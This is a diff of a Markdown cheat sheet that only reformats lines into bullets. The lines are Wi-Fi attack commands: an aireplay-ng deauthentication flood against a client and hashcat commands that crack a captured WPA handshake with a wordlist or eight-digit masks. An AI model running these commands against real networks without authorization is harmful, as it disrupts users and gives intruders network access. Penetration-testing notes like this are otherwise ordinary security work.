@@ -36,10 +36,10 @@
 * `aireplay-ng --deauth 2000 -a [MAC of Access Point] [MAC of  Client] wlan1mon`
 
 ## Cracking Handshake file with Hashcat (Windows)
-`hashcat64.exe -m 2500 capture.hccap wordlist.lst`
+* `hashcat64.exe -m 2500 capture.hccap wordlist.lst`
 * Keyspace method
-`hashcat64.exe -m 2500 -a3 capture.hccap -1 1234567890 ?1?1?1?1?1?1?1?1`
-`hashcat64.exe -m 2500 -a3 capture.hccap -1 ?d?d?d?d?d?d?d?d`
+* `hashcat64.exe -m 2500 -a3 capture.hccap -1 1234567890 ?1?1?1?1?1?1?1?1`
+* `hashcat64.exe -m 2500 -a3 capture.hccap -1 ?d?d?d?d?d?d?d?d`
 
 
 
